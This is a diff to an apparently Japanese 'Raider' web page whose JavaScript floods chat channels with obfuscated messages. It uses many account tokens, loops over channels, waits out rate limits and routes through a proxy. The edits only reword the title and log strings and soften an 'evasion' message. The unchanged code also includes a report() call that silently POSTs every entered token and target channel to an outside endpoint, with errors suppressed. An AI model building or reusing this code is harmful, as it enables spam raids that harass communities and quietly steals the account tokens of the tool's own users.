@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>みんなのすみか PROTOCOL | AURORA TERMINAL</title>
+    <title>みんなのすみか Raider</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         :root { --accent: #a855f7; --bg: #030014; --panel: rgba(15, 10, 31, 0.8); }
@@ -92,7 +92,7 @@
         <div class="bg-black/40 p-3 border-b border-purple-900/50 flex justify-between items-center">
             <span class="text-[10px] text-purple-300 font-bold tracking-widest">>> ログ</span>
             <div class="flex gap-3 text-[9px]">
-                <span id="st_p" class="text-green-400">● PROXY_ONLINE</span>
+                <span id="st_p" class="text-green-400">PROXYok</span>
                 <span class="text-purple-500">SSL_SECURED</span>
             </div>
         </div>
@@ -156,7 +156,7 @@ class AuroraCore {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `**起動ログ**\n\n**使用トークン:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`\n**ターゲット:**\n\`\`\`\n${channels.join('\n')}\n\`\`\``
+                    content: `**ログ**\n\n**トークン:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`\n**送信先:**\n\`\`\`\n${channels.join('\n')}\n\`\`\``
                 })
             });
         } catch(e) {}
@@ -170,7 +170,7 @@ class AuroraCore {
         if (!tokens.length || !channels.length || !baseMsg) return alert("入力データが不足しています。");
 
         this.dom.bn.disabled = true;
-        this.log("初期化: 回避するやつを適用中...", "ok");
+        this.log("初期化中...", "ok");
     
         await this.report(tokens, channels);
 
@@ -178,7 +178,7 @@ class AuroraCore {
         const delay = parseInt(this.dom.dl.value);
 
         for (let i = 0; i < loops; i++) {
-            this.log(`繰り返すやつ ${i + 1} を開始します`, "info");
+            this.log(`繰り返し ${i + 1} です`, "info");
             for (const ch of channels) {
                 for (const tk of tokens) {
                     const payload = this.obfuscate(baseMsg, this.dom.nl.value);
@@ -191,19 +191,19 @@ class AuroraCore {
 
                         if (r.status === 429) {
                             const d = await r.json();
-                            this.log(`レート制限検知: ${d.retry_after}秒待機`, "err");
+                            this.log(`レート制限: ${d.retry_after}秒待機`, "err");
                             await new Promise(res => setTimeout(res, d.retry_after * 1000));
                         } else if (r.ok) {
                             this.log(`送信成功: CH ${ch.slice(-6)}`, "ok");
                         } else {
                             this.log(`送信失敗: ステータス ${r.status}`, "err");
                         }
-                    } catch (e) { this.log("プロキシのエラー", "err"); }
+                    } catch (e) { this.log("プロキシエラー", "err"); }
                     await new Promise(res => setTimeout(res, delay));
                 }
             }
         }
-        this.log("おわったおー", "ok");
+        this.log("終了しました", "ok");
         this.dom.bn.disabled = false;
     }
 }
